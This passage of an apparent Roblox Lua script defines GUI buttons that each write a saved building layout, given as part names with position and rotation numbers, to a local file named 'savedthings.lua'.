Part43/-126, 14.7999992, 27, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part38/-127.000008, 14.2999992, 27, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part45/-128, 13.7999992, 27, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part23/-127.121323, 14.42132, 27, 0.707106769, 0.707106769, 0, -0.707106769, 0.707106769, 0, 0, 0, 1
Part24/-126.5, 13.8000011, 27, 0.707106829, 0.707106709, 0, -0.707106709, 0.707106829, 0, 0, 0, 1
Part26/-127, 10.3000002, 27, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part28/-128, 10.3000002, 27, 1, 0, 0, 0, 1, 0, 0, 0, 1]])
end)

local lfb = tab6:Button("FEATURED hut (by Kozy)", function()
	writefile("savedthings.lua", [[SmoothBlockModel12/-106, -0.699998856, 73, -2.82129974e-07, -1, 1.07017879e-08, 1, -2.82129974e-07, 1.1924886e-08, -1.19248833e-08, 1.07017915e-08, 1
SmoothBlockModel169/-106, -0.699999809, 78.6999969, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel230/-106, -0.699999809, 84, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel163/-106, -0.699999809, 90, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel184/-108.400002, -0.699999809, 93, -4.37113883e-08, 0, -1, 1, -4.37113883e-08, -4.37113883e-08, -4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel229/-114, 13.3000002, 93, -4.37113883e-08, 0, -1, -1, -4.37113883e-08, 4.37113883e-08, -4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel47/-120, 13.3000002, 93, -4.37113883e-08, 0, -1, -1, -4.37113883e-08, 4.37113883e-08, -4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel136/-126, 13.3000002, 93, -4.37113883e-08, 0, -1, -1, -4.37113883e-08, 4.37113883e-08, -4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel200/-132, 13.3000002, 93, -4.37113883e-08, 0, -1, -1, -4.37113883e-08, 4.37113883e-08, -4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel91/-134.5, 13.3000002, 90, -4.37113883e-08, 1, 4.37113883e-08, -1, -4.37113883e-08, 0, 1.91068547e-15, -4.37113883e-08, 1
SmoothBlockModel44/-134.5, 13.3000002, 78, 7.54979013e-08, -1, -1.19248806e-08, -1, -7.54979013e-08, -1.50995803e-07, 1.50995803e-07, 1.19248922e-08, -1
SmoothBlockModel138/-134.5, 13.3000002, 84, -4.37113883e-08, 1, 4.37113883e-08, -1, -4.37113883e-08, 0, 1.91068547e-15, -4.37113883e-08, 1
SmoothBlockModel92/-134.5, 13.3000002, 73, -4.37113883e-08, 1, 4.37113918e-08, -1, -4.37113918e-08, 5.56362707e-08, 5.56362743e-08, -4.37113883e-08, 1
SmoothBlockModel55/-132.100006, 13.3000002, 70, -4.37113883e-08, 0, -1, -1, -4.37113883e-08, 4.37113883e-08, -4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel28/-127, 13.3000002, 70, -4.37113883e-08, 0, -1, -1, -4.37113883e-08, 4.37113883e-08, -4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel17/-108.400002, 13.3000002, 70, -4.37113883e-08, 0, -1, -1, -4.37113883e-08, 4.37113883e-08, -4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel59/-108.399223, 11.6999998, 68.9989014, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel133/-108.398804, 11.6999998, 79.9992218, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel16/-114.399223, 11.6999998, 68.4000015, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel167/-113.999527, 11.6999998, 80.399025, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel25/-120.399223, 11.6999998, 68.4000015, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel90/-125.999527, 11.6999998, 79.399025, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel172/-126.399223, 11.6999998, 69.4000015, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel231/-130.999527, 11.6999998, 79.399025, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel58/-131.399216, 11.6999998, 69.4000015, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel232/-122, 1.37, 83.5, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel167/-113.999619, 11.6999998, 80.3992157, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel133/-108.397972, 11.6999998, 79.9990005, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel54/-121, 13.3000002, 70, -4.37113883e-08, 0, -1, -1, -4.37113883e-08, 4.37113883e-08, -4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel139/-120.00779, 11.6999998, 79.3923874, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08]])
end)

local lfb = tab6:Button("FEATURED House blocker (by Tech)", function()
	writefile("savedthings.lua", [[Left Wall/-3.17016602, 9.14442062, 100.589722, 0, 0, 1, 0, 1, 0, -1, 0, 0
Jump7/-27.3909664, 11.9915695, 42.9598846, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump8/-33.1381264, 8.83331776, 43.5713425, 0, 0, -1, 0, 1, 0, 1, 0, 0
Right Wall/-57.0649796, 5.1717062, 109.710953, 0, 0, 1, 0, 1, 0, -1, 0, 0
Back Wall/-10.992548, 9.9960022, 99.3665619, -1, 0, 0, 0, 1, 0, 0, 0, -1]])
end)

local lfb = tab6:Button("FEATURED KAHObbyButSimple (by Tech)", function()
	writefile("savedthings.lua", [[Jump2/10.003418, 212.429993, -34.9994507, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump1/1.93499768, 212.429993, -19.7569981, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
Jump3/3.93499756, 212.429993, 9.04300022, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump6/-5.06500244, 212.429993, 19.2430019, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump8/-0.0650024414, 212.429993, 29.2430019, 0, 0, -1, 0, 1, 0, 1, 0, 0
Regen/-46.3355179, 1.40844679, -28.0117493, 0, 0, -1, 0, 1, 0, 1, 0, 0]])
end)

local lfb = tab6:Button("FEATURED myobbysucks (by Deontae)", function()
	writefile("savedthings.lua", [[Part7/-79, 7.20170879, 33, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part6/-83, 13.2017088, 32, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part5/-79, 21.4017086, 33, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part4/-82, 24.4017105, 42, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part3/-97, 25.6017113, 45, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part2/-100, 26.801712, 54, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part1/-100, 28.0017128, 64, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part33/-97, 27.9017124, 72, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel196/-98, 23.4017143, 81, -4.37113883e-08, -1, -1.04250613e-15, 1, -4.37113883e-08, -8.74227766e-08, 8.74227766e-08, -4.86387706e-15, 1
Part46/-101.5, 38.9017067, 93, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
Part23/-115, 39.0017052, 89.5, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part26/-115, 40.0017052, 99.5, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel95/-112, 36.2017097, 167, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
Jump3/-114, 37.4017067, 109, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump8/-104, 37.4017067, 114, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump7/-111, 37.4017067, 120, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump6/-110, 37.4017067, 127, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump4/-111.999992, 37.4017067, 134, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump5/-110, 37.4017067, 142, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump1/-111.999992, 37.4017067, 148, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump/-114, 37.4017067, 154, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump9/-116, 37.6017036, 168, 1, 0, 0, 0, 1, 0, 0, 0, 1
Jump2/-108, 37.4017067, 167, -1, -8.74227766e-08, 4.37113883e-08, -8.74227837e-08, 1, -8.74227766e-08, -4.37113812e-08, -8.74227837e-08, -1
Part32/-113, 41.7017021, 164, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part49/-109.5, 45.7017021, 163, 0, 0, 1, 0, -1, 0, 1, 0, 0
Part40/-114, 50.7017021, 165.5, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel164/-120, 52.0017014, 168, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel153/-112, 77.2016907, 174, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel202/-115, 71.0016937, 182, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel127/-115, 56.8017006, 236, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel186/-114.800003, 56.4016991, 182, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel191/-109.999992, 59.8017006, 193, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel200/-115, 68.0016937, 203, -4.37113883e-08, 0, -1, -1, -4.37113883e-08, 4.37113883e-08, -4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel134/-108, 62.2016983, 213, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel187/-113, 83.4016876, 173, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel214/-105, 90.6016846, 193, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel154/-95.9098053, 97.4016571, 198.583588, -0.99950403, -8.73794193e-08, -0.031491179, -9.21778138e-08, 1, 1.50920911e-07, 0.031491179, 1.53748843e-07, -0.99950403
SmoothBlockModel38/-65, 92.4016876, 232, -1, -1.50995803e-07, 0, -1.50995803e-07, 1, -1.50995803e-07, 2.27997332e-14, -1.50995803e-07, -1
SmoothBlockModel158/-104.777397, 99.2016602, 216.990982, -0.0314911529, -4.75503192e-09, 0.99950403, -7.48912043e-11, 1, 4.75503192e-09, -0.99950403, 7.48912043e-11, -0.0314911529
SmoothBlockModel112/-108.523483, 100.401657, 273.112976, -0.0314911529, -4.75503192e-09, 0.99950403, -7.48912043e-11, 1, 4.75503192e-09, -0.99950403, 7.48912043e-11, -0.0314911529
Part31/-98, 36.4017067, 77, 0, 0, -1, 0, 1, 0, 1, 0, 0]])
end)

local lfb = tab6:Button("FEATURED fakeregen (by Damix)", function()
	writefile("savedthings.lua", [[Part56/-5.06499958, 6.63000011, 96.2430115, -4.37113883e-08, -1, 0, -1, 4.37113883e-08, 1.50995803e-07, -1.50995803e-07, 6.60023616e-15, -1
Part29/-4.06500053, 5.43000031, 96.2430038, -1, -1.50995803e-07, 0, -1.50995803e-07, 1, -1.50995803e-07, 2.27997332e-14, -1.50995803e-07, -1
Part57/-8.06499958, 5.13000011, 94.2430115, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
Part49/-6.36500072, 5.13000011, 92.2430038, -4.37113883e-08, 0, 1, -1.50995803e-07, -1, -6.60023616e-15, 1, -1.50995803e-07, 4.37113883e-08
Part40/-5.06500053, 5.13000011, 94.7430038, -1, -1.50995803e-07, 0, -1.50995803e-07, 1, -1.50995803e-07, 2.27997332e-14, -1.50995803e-07, -1]])
end)

local lfb = tab6:Button("FEATURED ihangpeople (by Damix)", function()
	writefile("savedthings.lua", [[SmoothBlockModel230/49.2000008, -5.20000029, -8.30000019, -4.37113883e-08, 0, -1, 1, -4.37113883e-08, -4.37113883e-08, -4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel158/70, 4.90000153, -7.60000181, -1, -8.74227766e-08, 0, -3.82137093e-15, 4.37113883e-08, 1, -8.74227766e-08, 1, -4.37113883e-08
SmoothBlockModel94/56, 1, -7.5999999, 1, 0, 0, 0, -4.37113883e-08, -1, 0, 1, -4.37113883e-08
SmoothBlockModel220/76.4000015, -5.20000029, -8.30000019, -4.37113883e-08, 0, -1, 1, -4.37113883e-08, -4.37113883e-08, -4.37113883e-08, -1, 1.91068547e-15
Jump5/63, 7.50000334, -10.2000008, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel104/68.4000015, 2.69999862, 54, -4.37113883e-08, 1, 0, 4.37113883e-08, 1.91068547e-15, -1, -1, -4.37113883e-08, -4.37113883e-08
SmoothBlockModel123/57.6000023, 2.80000162, -8.00000191, -4.37113883e-08, -1, 0, -4.37113883e-08, 1.91068547e-15, -1, 1, -4.37113883e-08, -4.37113883e-08
SmoothBlockModel102/60, 6.30000019, 54, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel100/66, 6.30000019, 53.9999962, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel54/70, -0.0999993682, 53.5999985, -1, 1.50995803e-07, 5.96046448e-08, -5.96046377e-08, 4.37113989e-08, -1, -1.50995803e-07, -1, -4.37113883e-08
SmoothBlockModel120/70, 4.9000001, 53.5999985, -1, 8.74227766e-08, 0, 3.82137093e-15, 4.37113883e-08, -1, -8.74227766e-08, -1, -4.37113883e-08
SmoothBlockModel193/76.2000046, -5, 55.2000008, -4.37113883e-08, 0, -1, 1, -4.37113883e-08, -4.37113883e-08, -4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel168/49.7000008, -5, 55.2000046, -4.37113883e-08, 0, -1, 1, -4.37113883e-08, -4.37113883e-08, -4.37113883e-08, -1, 1.91068547e-15
Jump4/63, 7.5, 53.0999985, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
Jump7/58, 7.50000048, 37.0999985, -1, -1.50995803e-07, 0, -1.50995803e-07, 1, -1.50995803e-07, 2.27997332e-14, -1.50995803e-07, -1
Jump8/53.9999962, 7.50000286, 8.79999924, 1, 0, 0, 0, 1, 0, 0, 0, 1
Jump3/68, 7.5, 8.79999638, 1, 0, 0, 0, 1, 0, 0, 0, 1
Jump6/68, 7.5, 37.1999969, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel99/64, 2.5, 33.9999962, -4.37113883e-08, 0, -1, 1, -4.37113883e-08, -4.37113883e-08, -4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel121/63.9000015, 2.5, 23.3999977, -4.37113883e-08, 0, -1, 1, -4.37113883e-08, -4.37113883e-08, -4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel124/64, 11.3000021, 35.6999969, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel1/68, 7.50000048, 12.5999975, -1, -1.50995803e-07, 0, -1.50995803e-07, 1, -1.50995803e-07, 2.27997332e-14, -1.50995803e-07, -1
SmoothBlockModel5/68, 8.10000134, 14.5999966, -1, -1.50995803e-07, 0, -1.50995803e-07, 1, -1.50995803e-07, 2.27997332e-14, -1.50995803e-07, -1
SmoothBlockModel3/68, 9.90000153, 17.5999966, -1, -1.50995803e-07, 0, -1.50995803e-07, 1, -1.50995803e-07, 2.27997332e-14, -1.50995803e-07, -1
SmoothBlockModel178/68, 11.1000004, 18.5999966, -1, -1.50995803e-07, 0, 1.50995803e-07, -1, 0, 0, 0, 1
SmoothBlockModel9/68, 8.10000134, 17.5999966, -1, -1.50995803e-07, 0, -1.50995803e-07, 1, -1.50995803e-07, 2.27997332e-14, -1.50995803e-07, -1
SmoothBlockModel121/63.9000015, 2.5, 23.3999977, -4.37113883e-08, 0, -1, 1, -4.37113883e-08, -4.37113883e-08, -4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel124/64, 11.3000021, 35.6999969, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel99/64, 2.5, 33.9999962, -4.37113883e-08, 0, -1, 1, -4.37113883e-08, -4.37113883e-08, -4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel51/67.9999924, -1.10000515, 28.9999962, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel36/64.5999908, 28.4999962, 30.9999962, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel114/61.1999893, 22.8999939, 28.9999962, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
Part23/61.1999969, 18.8999939, 29.0299969, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
Part28/61.1999969, 19.2999954, 31.9999962, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
Part25/61.3099937, 20.4999943, 27.4999962, -4.37113883e-08, 1, 0, -1, -4.37113883e-08, 0, 0, 0, 1
Part26/61.2999954, 20.4999943, 30.4999962, -4.37113883e-08, 1, 0, -1, -4.37113883e-08, 0, 0, 0, 1
Part24/61.1999969, 16.0999947, 25.9999962, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08]])
end)

local lfb = tab6:Button("FEATURED improved insane room (by Kozy)", function()
	writefile("savedthings.lua", [[SmoothBlockModel40/-25.4650097, 240.230011, 137.640015, -4.37113883e-08, 1, -4.37113918e-08, -1.94707184e-07, -4.37113989e-08, -1, -1, -4.37113812e-08, 1.94707184e-07
SmoothBlockModel112/-81.0650024, 212.429993, 98.8399963, -4.37113883e-08, -1, 1.19248806e-08, 1, -4.37113883e-08, 0, 5.21253064e-16, 1.19248806e-08, 1
SmoothBlockModel38/-24.465004, 240.62999, 123.840004, -1, -1.50995803e-07, 0, 1.13998666e-14, -7.54979013e-08, 1, -1.50995803e-07, 1, 7.54979013e-08
SmoothBlockModel52/-29.0650063, 241.029999, 73.6300049, 1, 0, 0, 0, -4.37113883e-08, -1, 0, 1, -4.37113883e-08
SmoothBlockModel123/-31.0650043, 212.829987, 72.2300034, -4.37113883e-08, 0, 1, 1, -4.37113883e-08, 4.37113883e-08, 4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel86/-37.0650063, 212.830002, 72.2300034, -4.37113883e-08, 0, 1, 1, -4.37113883e-08, 4.37113883e-08, 4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel88/-43.0650024, 212.829987, 72.2300034, -4.37113883e-08, 0, 1, 1, -4.37113883e-08, 4.37113883e-08, 4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel87/-49.0650024, 274.830017, 72.2300034, -4.37113883e-08, 0, 1, -1, -4.37113883e-08, -4.37113883e-08, 4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel125/-55.0650024, 274.829987, 72.2300034, -4.37113883e-08, 0, 1, -1, -4.37113883e-08, -4.37113883e-08, 4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel137/-61.0650024, 274.829987, 72.2399979, -4.37113883e-08, 0, 1, -1, -4.37113883e-08, -4.37113883e-08, 4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel127/-67.0650024, 274.830017, 72.2399979, -4.37113883e-08, 0, 1, -1, 7.54979013e-08, -4.37113883e-08, -7.54979013e-08, -1, -3.30011808e-15
SmoothBlockModel110/-73.0650024, 274.830017, 72.2399979, -4.37113883e-08, 0, 1, -1, -4.37113883e-08, -4.37113883e-08, 4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel95/-79.0650024, 274.830017, 72.2430038, -4.37113883e-08, 0, 1, -1, -4.37113883e-08, -4.37113883e-08, 4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel104/-29.0650101, 213.830032, 131.640015, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel100/-35.0650101, 213.830032, 126.640022, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel102/-41.0650101, 213.830032, 130.640015, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel128/-46.9995728, 213.830002, 127.999573, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel109/-53.9995728, 213.830002, 85.9995728, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel119/-53.9995728, 213.830002, 97.9995728, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel96/-52.9995728, 213.830002, 95.9995728, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel156/-58.9995728, 213.830002, 95.9995728, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel59/-52.9995728, 213.830002, 107.999573, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel167/-52.465004, 213.830002, 109.639992, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel111/-58.9995728, 213.830002, 107.999573, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel78/-64.9995728, 213.830002, 119.999573, 1, 1.74845553e-07, 0, -1.74845553e-07, 1, 7.64274186e-15, 1.33629948e-21, -7.64274186e-15, 1
SmoothBlockModel63/-60.9995728, 213.830002, 71.9995728, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel61/-60.9995728, 213.830002, 83.9995728, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel158/-61.9995728, 213.830002, 109.999573, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel94/-61.9995728, 213.830002, 121.999573, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel133/-66.0650024, 213.830002, 71.8399963, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel172/-65.9995728, 213.830002, 78.9995728, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel25/-66.0650024, 213.830002, 85.8399963, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel139/-66.465004, 213.830002, 97.6399918, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel124/-62.4000015, 213.830002, 109.639992, -1, -1.50995803e-07, -4.37113883e-08, -1.50995803e-07, 1, -1.50995803e-07, 4.37114096e-08, -1.50995803e-07, -1
SmoothBlockModel16/-66.465004, 213.830002, 109.639992, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel90/-72.0650024, 213.830002, 71.8399963, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel77/-72.0650024, 213.830002, 83.8399963, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel18/-72.0650024, 213.830002, 94.8399963, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel34/-72.465004, 213.830002, 109.639992, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel219/-77.0650024, 213.830002, 71.8399963, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel153/-80.6650009, 213.830002, 84.8399963, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel23/-77.0650024, 213.830002, 83.8399963, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel151/-82.0650024, 213.830002, 82.8399963, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel177/-77.1424713, 213.830002, 90.9565887, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel177/-77.1424713, 213.830002, 90.9565887, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel170/-82.465004, 213.830002, 94.8399963, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel76/-76.9995728, 213.830002, 97.9995728, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel107/-76.9995728, 213.830002, 104.999573, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel141/-82.465004, 213.830002, 106.839996, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel157/-77.465004, 213.830002, 109.839996, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel180/-81.465004, 213.830002, 112.639992, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
Spawn2/-53.0009117, 215.09404, 95.0013733, -1, 0, 0, 0, 1, 0, 0, 0, -1
Spawn1/-45.0009155, 215.03154, 80.0010147, -1, 0, 0, 0, 1, 0, 0, 0, -1
Spawn3/-42.0009422, 215.030457, 93.9972992, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel33/-28.0635529, 267.429993, 71.841217, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel216/-31.0635529, 267.429993, 70.841217, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel168/-28.0645447, 267.429993, 83.6384125, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel229/-28.0645447, 267.429993, 95.6384125, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel138/-28.465744, 267.429993, 107.641617, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel169/-28.4657478, 267.429993, 111.641617, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel47/-30.4657478, 267.429993, 119.839996, -1, -1.50995803e-07, 8.74227766e-08, -1.50995817e-07, 1, -1.50995803e-07, -8.74227553e-08, -1.50995817e-07, -1
SmoothBlockModel231/-42.4628067, 267.429993, 119.841263, -1, -1.50995803e-07, 8.74227766e-08, -1.50995817e-07, 1, -1.50995803e-07, -8.74227553e-08, -1.50995817e-07, -1
SmoothBlockModel184/-54.465744, 267.429993, 119.641617, -1, -1.50995803e-07, 8.74227766e-08, -1.50995817e-07, 1, -1.50995803e-07, -8.74227553e-08, -1.50995817e-07, -1
SmoothBlockModel54/-66.465744, 267.429993, 119.641617, -1, -1.50995803e-07, 8.74227766e-08, -1.50995817e-07, 1, -1.50995803e-07, -8.74227553e-08, -1.50995817e-07, -1
SmoothBlockModel152/-78.4628067, 267.429993, 109.841263, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel12/-78.4628067, 267.429993, 97.8412628, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel220/-78.4628067, 267.429993, 85.8412628, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel163/-78.4628067, 267.429993, 73.8412628, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel91/-68.5, 267.429993, 74.8439102, -1, -1.50995803e-07, 8.74227766e-08, -1.50995817e-07, 1, -1.50995803e-07, -8.74227553e-08, -1.50995817e-07, -1
SmoothBlockModel44/-70.4628067, 267.429993, 74.8412628, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel17/-59.0635681, 267.429993, 74.8270035, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel58/-47.0635529, 267.429993, 74.841217, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel28/-34.0635529, 267.429993, 76.841217, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel149/-33.0645447, 267.429993, 102.638412, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel79/-33.465744, 267.429993, 100.641617, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
